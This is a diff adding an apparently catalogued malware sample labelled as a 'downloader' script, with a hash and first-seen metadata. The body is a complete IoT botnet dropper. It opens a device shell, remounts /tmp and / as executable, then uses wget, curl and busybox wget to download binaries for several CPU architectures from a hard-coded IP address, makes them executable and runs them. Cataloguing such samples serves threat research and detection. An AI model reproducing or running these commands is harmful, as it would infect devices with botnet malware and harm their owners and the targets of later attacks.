@@ -1,0 +1,24 @@
+# sha256: b78d2bedfcd6720965346c994ec2025d15d52fa5c45ced24acef46ce5b06640b
+# family: downloader
+# kind: script
+# size_bytes: 972
+# first_seen: 2026-05-31 01:10:42.974588 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+enable
+system
+shell
+sh
+mount -o remount,exec /tmp 2>/dev/null;mount -o remount,exec / 2>/dev/null
+cd /tmp||cd /var/tmp||cd /dev/shm||cd /run||cd /root||cd /
+wget http://209.92.170.225/lmkjn.arm7 && chmod 777 lmkjn.arm7 && ./lmkjn.arm7 arm7.wget
+wget http://209.92.170.225/lmkjn.mips && chmod 777 lmkjn.mips && ./lmkjn.mips mips.wget
+wget http://209.92.170.225/lmkjn.x86 && chmod 777 lmkjn.x86 && ./lmkjn.x86 x86.wget
+curl -O http://209.92.170.225/lmkjn.arm6 && chmod 777 lmkjn.arm6 && ./lmkjn.arm6 arm6.curl
+curl -O http://209.92.170.225/lmkjn.mips && chmod 777 lmkjn.mips && ./lmkjn.mips mips.curl
+curl -O http://209.92.170.225/lmkjn.x86 && chmod 777 lmkjn.x86 && ./lmkjn.x86 x86.curl
+busybox wget http://209.92.170.225/lmkjn.arm6 && chmod 777 lmkjn.arm6 && ./lmkjn.arm6 arm6.bwget
+busybox wget http://209.92.170.225/lmkjn.mips && chmod 777 lmkjn.mips && ./lmkjn.mips mips.bwget
+busybox wget http://209.92.170.225/lmkjn.x86 && chmod 777 lmkjn.x86 && ./lmkjn.x86 x86.bwget
